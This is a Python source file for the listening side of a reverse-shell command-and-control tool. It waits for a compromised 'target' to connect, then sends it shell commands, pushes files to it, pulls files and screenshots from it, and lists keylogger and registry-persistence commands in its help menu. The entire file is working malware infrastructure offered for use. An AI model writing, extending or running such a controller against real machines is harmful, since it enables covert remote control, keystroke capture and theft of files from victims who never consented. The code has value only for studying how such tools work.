import socket
import termcolor
import json
import os
import calendar
import time


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))

        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            if os.name == 'nt':
                os.system("cls")
            else:
                os.system("clear")
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot-%d.png' % (calendar.timegm(time.gmtime())), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()

        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit session with the target
            clear                               --> Clear the screen
            cd *Directory Name*                 --> Changes Directory on target System
            upload *File Name*                  --> Upload file to the target Machine
            download *File Name*                --> Download file from the target Machine
            keylog_start                        --> Start the Keylogger
            keylog_dump                         --> Print Keystrokes that the target inputted
            keylog_stop                         --> Stop and self Destruct Keylogger file
            persistence *RegName* *FileName*    --> Create persistence in Registry
            '''))
        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(termcolor.colored('[+] Listening for the incoming connection...', 'green'))
sock.listen(5)

target, ip = sock.accept()
print(termcolor.colored('[+] Target connected from: ' + str(ip), 'green'))

target_communication()
